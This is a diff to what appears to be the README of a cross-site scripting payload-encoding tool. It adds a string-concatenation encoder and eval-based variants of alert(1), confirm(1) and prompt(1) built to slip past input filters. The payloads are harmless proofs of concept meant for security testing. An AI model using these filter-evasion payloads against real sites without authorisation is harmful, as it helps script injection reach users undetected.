@@ -9,6 +9,7 @@ cat payloads.txt | python3 HTML-Entity-Encoding.py
 cat payloads.txt | python3 HTML-Hexadecimal-Entity-Encoding-Special-Characters.py
 cat payloads.txt | python3 HTML-Hexadecimal-Entity-Encoding.py
 cat payloads.txt | python3 Unicode-Encoded-Payloads.py
+cat payloads.txt | python3 String-Concatenation.py
 ```
 
 ## alert(1)
@@ -54,6 +55,14 @@ al\u0065rt(1)
 ale\u0072t(1)
 aler\u0074(1)
 \u0061\u006c\u0065\u0072\u0074(1)
+
+// String-Concatenation
+eval("a"+"lert(1)")
+eval("al"+"ert(1)")
+eval("ale"+"rt(1)")
+eval("aler"+"t(1)")
+eval("alert"+"(1)")
+eval("a"+"l"+"e"+"r"+"t"+"(1)")
 ```
 
 ## confirm(1)
@@ -107,6 +116,16 @@ conf\u0069rm(1)
 confi\u0072m(1)
 confir\u006d(1)
 \u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)
+
+// String-Concatenation
+eval("c"+"onfirm(1)")
+eval("co"+"nfirm(1)")
+eval("con"+"firm(1)")
+eval("conf"+"irm(1)")
+eval("confi"+"rm(1)")
+eval("confir"+"m(1)")
+eval("confirm"+"(1)")
+eval("c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)")
 ```
 
 ## prompt(1)
@@ -156,4 +175,13 @@ pro\u006dpt(1)
 prom\u0070t(1)
 promp\u0074(1)
 \u0070\u0072\u006f\u006d\u0070\u0074(1)
+
+// String-Concatenation
+eval("p"+"rompt(1)")
+eval("pr"+"ompt(1)")
+eval("pro"+"mpt(1)")
+eval("prom"+"pt(1)")
+eval("promp"+"t(1)")
+eval("prompt"+"(1)")
+eval("p"+"r"+"o"+"m"+"p"+"t"+"(1)")
 ```
